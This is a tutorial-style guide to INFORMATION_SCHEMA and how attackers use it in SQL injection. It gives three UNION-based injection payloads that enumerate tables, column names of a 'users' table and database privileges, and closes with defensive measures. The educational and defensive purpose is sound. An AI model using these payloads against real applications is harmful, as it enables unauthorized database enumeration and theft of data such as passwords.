# INFORMATION_SCHEMA Guide for SQL Injection

## What is INFORMATION_SCHEMA?

INFORMATION_SCHEMA is a virtual database present in many SQL database management systems that provides access to the database metadata. It contains information about all database objects including:

- Tables
- Columns
- Views
- Routines (stored procedures and functions)
- Constraints
- User privileges
- Database settings

This virtual database acts as a read-only, system catalog that allows users to query structural information about the database itself.

## Purpose and Usage

INFORMATION_SCHEMA serves several legitimate purposes:

- Database administrators use it to inspect database structure
- Application developers use it for schema introspection
- Development tools use it to provide autocomplete and schema browsing
- Database migration scripts use it to verify schema changes

## Example Basic Queries

```sql
-- List all tables in a specific database
SELECT TABLE_NAME 
FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_SCHEMA = 'database_name';

-- Get column information for a specific table
SELECT COLUMN_NAME, DATA_TYPE 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE TABLE_NAME = 'table_name';

-- View user privileges
SELECT * FROM INFORMATION_SCHEMA.USER_PRIVILEGES;
```

## Role in SQL Injection Attacks

During SQL injection attacks, INFORMATION_SCHEMA provides attackers with critical information about the database structure, which can be used to:

1. **Discover database tables**: Attackers can enumerate all tables in the database
2. **Identify sensitive tables**: Tables with names like "users", "accounts", or "admin" may contain valuable data
3. **Map table structures**: Understanding column names and data types enables more precise attacks
4. **Discover user privileges**: Identifying database users with elevated privileges

## Common SQL Injection Payloads Using INFORMATION_SCHEMA

### Discovering Tables

If an application runs a query like:
```sql
SELECT * FROM users WHERE username = '$input'
```

An attacker could inject:
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=DATABASE() -- 
```

This would return all table names in the current database.

### Learning Column Names

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

This payload reveals all column names in the "users" table, which may include sensitive fields like "password", "credit_card", etc.

### Viewing User Privileges

```sql
' UNION SELECT * FROM information_schema.user_privileges --
```

This can expose which database users have administrative privileges, potentially leading to privilege escalation attacks.

## Protection Measures

To protect against SQL injection attacks that exploit INFORMATION_SCHEMA:

1. **Use Parameterized Queries**: Prevent injection by properly separating code from data
2. **Restrict User Privileges**: Database users should operate with least privilege principles
3. **Implement WAF (Web Application Firewall)**: Filter malicious SQL injection attempts
4. **Regular Security Testing**: Conduct SQL injection vulnerability assessments
5. **Input Validation**: Validate and sanitize all user inputs
6. **Error Handling**: Avoid exposing database error messages to users

## Database-Specific Notes

- **MySQL/MariaDB**: Full INFORMATION_SCHEMA implementation
- **PostgreSQL**: Similar functionality through "information_schema" schema and pg_catalog
- **Microsoft SQL Server**: Supports INFORMATION_SCHEMA views plus system tables
- **Oracle**: Uses ALL_TABLES, ALL_TAB_COLUMNS instead of INFORMATION_SCHEMA
- **SQLite**: Uses sqlite_master table instead of INFORMATION_SCHEMA